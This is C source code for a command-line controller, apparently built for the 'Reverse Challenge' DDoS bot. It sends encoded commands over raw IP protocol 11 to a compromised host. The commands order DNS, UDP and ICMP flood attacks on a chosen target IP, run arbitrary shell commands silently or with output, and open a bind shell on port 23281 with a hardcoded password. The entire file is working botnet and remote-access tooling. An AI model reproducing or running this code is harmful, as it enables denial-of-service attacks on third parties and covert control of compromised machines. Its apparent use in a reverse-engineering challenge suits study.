#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
#include <netinet/in.h>
#include "client.h"

command_t command_list[] = { {"!", do_run },
		{"help", do_help },
		{"setaddr", do_setaddr },
		{"portshell", do_portshell },
		{ "stat", do_stat },
		{"quit", do_quit },
		{"kill", do_kill },
		{"dnsswarm", do_dnsswarm },
		{"dnsflood", do_dnsflood },
		{"udpflood", do_udpflood },
		{"icmpflood", do_icmpflood },
		{"command", do_command },
		{NULL, NULL } };

struct sockaddr_in g_sin;
int g_raw_socket;

int
main(int argc, char **argv)
{
	int i;
	unsigned char buffer[1024];
	int write_len;
	char *arg, *command;

	if(argc != 2) {
		printf("usage: client <ip of server>\n");
		exit(0);
	}

	memset(&g_sin, 0, sizeof(struct sockaddr_in));
	g_sin.sin_family = AF_INET;
	g_sin.sin_addr.s_addr = inet_addr(argv[1]);

	if( (g_raw_socket = socket(AF_INET, SOCK_RAW, 11)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	
	while(command = next_command(&arg)) {
		for(i = 0; command_list[i].name; i++) {
			if(strcmp(command, command_list[i].name) == 0) {
				command_list[i].handler(arg);
				break;
			}
		}
		if(command_list[i].name == NULL)  /* no match found */
			do_help(NULL);
	}

}

char *
next_command(char **arg)
{
	static char input[250];
	char *p;

  	printf("Reverse Challenge> ");
	fgets(input, sizeof(input), stdin);
	if(p = strchr(input, '\n'))
		*p = 0;
	if(p = strchr(input, ' ')) { /* look for a space */
		*p++ = 0;
		*arg = p;
		return input;
	}

	*arg = 0;
	return input;

}

void
do_quit(char *arg)
{
	exit(0);
}

void
do_help(char *arg)
{
	printf("\nReverse Challenge client commands\n\n");
	printf("help - print this help\n");
	printf("setaddr <ip address> - Inform the server of the client ip address\n");
	printf("portshell - open a portshell\n");
	printf("stat - return status information about what is running on the server\n");
	printf("quit - exit client\n");
	printf("kill - kill currently running command on server\n");
	printf("dnsswarm <target ip> - execute dnswarm attack against target\n");
	printf("dnsflood <target ip> - execute dnsflood attack against target\n");
	printf("udpflood <target ip> - execute udpflood attack against target\n");
	printf("icmpflood <target ip> - execute icmpflood attack against target\n");
	printf("command <shell command> - silently execute shell command on server\n");
	printf("! <shell command> - execute a shell command on server and return output\n");
		
}

void
do_run(char *command)
{
	char *p;
	int len;
	encode_and_send(ID_COMMAND, command, strlen(command));
	for(;;) {
		p = receive_data(&len);
		if(!p)
			return;
		/* There is an off by one bug copying a buffer in the server that
		 * prevents a terminating null from being copied.
		 */
		p[400] = 0;
		p += 2;
		
		if(*p == 0)  /* last packet */
			return;
		
		printf("%s", p);
	}
}

// Like ID_COMMAND but don't wait for any results
void
do_command(char *command)
{
	encode_and_send(ID_EXECUTE, command, strlen(command));
}

void
do_setaddr(char *my_addr) {

	in_addr_t addresses[10];
	char buffer[41];

	if(!my_addr) {
		printf("address argument required (ie: 192.168.1.1)\n");
		return;
	}
	addresses[0] = inet_addr(my_addr);
	if(addresses[0] == -1) {
		printf("Could not parse '%s' as an IP address\n", my_addr);
		return;
	}
	buffer[0] = 0; /* Mode for setting client address only */
	memcpy(buffer + 1, &addresses, sizeof(addresses)); 
	encode_and_send(ID_SETADDR, buffer, sizeof(buffer));

}


void
do_dnsswarm(char *target)
{
	in_addr_t ip;
	char buffer[8]; 

	ip = inet_addr(target);
	if(ip == -1) {
		printf("Could not convert '%s' to an IP address\n", target);
		return;
	}

	copy_ip(ip, buffer);
	buffer[4] = 0;
	buffer[5] = 0; /* random port */
	buffer[6] = 0; /* do not resolve */

	encode_and_send(ID_DNSSWARM, buffer, 7);
}

void
do_dnsflood(char *target)
{
	in_addr_t dst;
	char buffer[12];

	dst = inet_addr(target);
	if(dst == -1) {
		printf("Could not convert '%s' to an IP address\n");
		return;
	}
	copy_ip(dst, buffer);
	copy_ip(inet_addr("5.6.7.8"), buffer + 4);
	/*
	buffer[4] = 0;
	buffer[5] = 0;
	buffer[6] = 0;
	buffer[7] = 0;
	*/
	buffer[8] = 0; /* burst count */
	buffer[9] = 0;
	buffer[10] = 0; /* port */
	buffer[11] = 0;

	encode_and_send(ID_DNSFLOOD, buffer, 12);
}
void
do_udpflood(char *target)
{
	datagram_flood(target, 1);
}
void 
do_icmpflood(char *target)
{
	datagram_flood(target, 0);
}

void
datagram_flood(char *target, int type)
{
	in_addr_t ip;
	char buffer[12];


	if( (ip = inet_addr(target)) == -1) {
		printf("Could not convert '%s' to an ip address\n", target);
		return;
	}
	buffer[0] = type;
	buffer[1] = 0; /* we'll let the server choose the port */
	copy_ip(ip, buffer + 2);
	copy_ip(inet_addr("1.2.3.4"), buffer + 6);
	buffer[10] = 0;
	encode_and_send(ID_DATAGRAMFLOOD, buffer, 11);
}


void
do_portshell(char *arg)
{
	int stat = get_status();

	if(stat == -1) {
		printf("Cannot reach server\n");
		return;
	}
	if(stat != 0) {
		printf("Server is already running command %d", stat);
		return;
	}
	encode_and_send(ID_PORTSHELL, NULL, 0);
	printf("Shell bound to port number 23281\n");
	printf("Connect with netcat and type password 'SeNiF'\n");
}

void
do_stat(char *arg)
{
	int i;
	i = get_status();

	if(i == -1) 
		printf("Cannot reach server.\n");
	if(i) 
		printf("Server is running command number %d\n", i);
	else
		printf("Server is idle.\n");

}

void
do_kill(char *arg)
{
	int i;
	i = get_status();
	if(i == -1) {
		printf("Cannot reach server.\n");
		return;
	}
	if(i == 0) {
		printf("Nothing to kill.\n");
		return;
	}
	encode_and_send(ID_KILL, NULL, 0);
	printf("Command number %d killed on server.\n", i);
		
}
int
get_status()
{
	int len;
	char *p;

	encode_and_send(ID_STATUS, NULL, 0);
	p = receive_data(&len);
	if(!p)
		return -1;

	if(p[3]) 
		return p[4];
	else
		return 0;

}

/*
 * Copy an IP address from an in_addr_t to a char buffer in network byte
 * order regardless of how it's stored in memory.
 */
void
copy_ip(unsigned ip, char *buf)
{
	buf[0] = ip & 0xFF;
	buf[1] = (ip >> 8) & 0xFF;
	buf[2] = (ip >> 16) & 0xFF;
	buf[3] = (ip >> 24) & 0xFF;
}

char *
receive_data(int *recv_len)
{
	static char recv_buffer[1024];
	char *p_data = recv_buffer + 22; 
	int len, i;
	char check_byte = 0;
	unsigned char last,tmp;
	struct timeval timeout;
	fd_set rfds;



	while(check_byte != 3) {
		FD_ZERO(&rfds);
		FD_SET(g_raw_socket, &rfds);
		timeout.tv_sec = 5; 
		timeout.tv_usec = 0;
		if(select(g_raw_socket + 1, &rfds, NULL, NULL, &timeout) != 1)
			/* Timeout or error */
			return NULL;

		len = recv(g_raw_socket, recv_buffer, sizeof(recv_buffer));
		if(len < 0) {
			printf("Read failed\n");
			return NULL;
		}
		check_byte = *(recv_buffer + 20);
	}
	/* decode */
	last = p_data[0];
	p_data[0] -= 23;
	len -= 23;
	for(i = 1; i < len; i++) {
		tmp = p_data[i];
		p_data[i] -= (23 + last);
		last = tmp;
	}


	*recv_len = len;
	return p_data;
}

int
encode_and_send(int command_id, char *buffer, int buffer_len)
{
	char send_buffer[1024];
	char *p_data;
	int i, send_len;

	if(buffer_len > (sizeof(send_buffer) - 4)) 
		return -1;

	if(buffer_len > 200)
		send_len = buffer_len + 2;
	else
		send_len = 201;

	memset(send_buffer, 0, sizeof(send_buffer));
	send_buffer[0] = 2;
	send_buffer[3] = command_id;
	if(buffer_len)
		memcpy(send_buffer + 4, buffer, buffer_len);

	p_data = send_buffer + 2;
	/* encode here */
	p_data[0] += 23;
	for(i = 1; i < send_len - 2; i++) 
		p_data[i] += (23 + p_data[i - 1]);

	return sendto(g_raw_socket, send_buffer, send_len, 0, &g_sin, sizeof(struct sockaddr_in));
}


